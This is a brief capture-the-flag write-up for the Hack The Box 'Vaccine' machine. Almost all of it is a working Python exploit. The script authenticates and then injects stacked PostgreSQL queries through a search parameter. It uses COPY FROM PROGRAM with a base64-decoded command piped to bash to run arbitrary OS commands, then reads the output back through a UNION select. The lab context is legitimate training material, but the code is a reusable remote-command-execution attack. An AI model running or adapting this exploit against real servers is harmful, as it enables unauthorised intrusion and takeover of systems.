#### Hack The Box -  Vaccine 

Simple script using SQL Injection to run OS command on HTB Vaccine machine.  

```python
import requests
import re
import sys
import urllib.parse
import argparse
from base64 import b64encode


parser = argparse.ArgumentParser()
parser.add_argument('--target', metavar='<target url>', required=True, type=str)
parser.add_argument('--user', metavar='<username>', required=True, type=str)
parser.add_argument('--password', metavar='<password>', required=True, type=str)
parser.add_argument('--cmd', metavar='<command>', required=True, type=str)

args = parser.parse_args()

if not args.target.startswith('http://'):
    print('Error: Invalid url')
    parser.print_help()
    sys.exit()


pattern = re.compile(r'<td ?.*?>(.+)</td>')

payload = b64encode(bytes(args.cmd, 'utf-8')).decode('utf-8')

creds = {
        'username': args.user,
        'password': args.password
}


def validateResult(response):
    return pattern.findall(response.text)


def sqlExec(session=None, uri=None):
    try:
        response = session.get(uri)
    except requests.ConnectionError as e:
        print(e)
        return None
    return validateResult(response)


sql_cmds = [
    # ' union select NULL,version(),NULL,NULL,NULL--',
    # ' union select NULL,usename,NULL,NULL,NULL from pg_user--',
    # ' union select NULL,current_setting(\'is_superuser\'),NULL,NULL,NULL--',
    '; CREATE TABLE cmd_exec(cmd_output text)--',
    f'; COPY cmd_exec FROM PROGRAM \'echo {payload} | base64 -d | bash\'--',
    ' union select NULL,cmd_output,NULL,NULL,NULL from cmd_exec--',
    '; DROP TABLE IF EXISTS cmd_exec--',
]

session = requests.Session()
result = session.post(args.target, data=creds)

if result.status_code != 200:
    print('Authentication failed!')
    sys.exit(1)

for sql in sql_cmds:
    uri = args.target + '/dashboard.php?search=aaaa\'' \
        + urllib.parse.quote_plus(sql)
    output = sqlExec(session, uri)
    if output:
        print('\n'.join(output))

session.close()
```
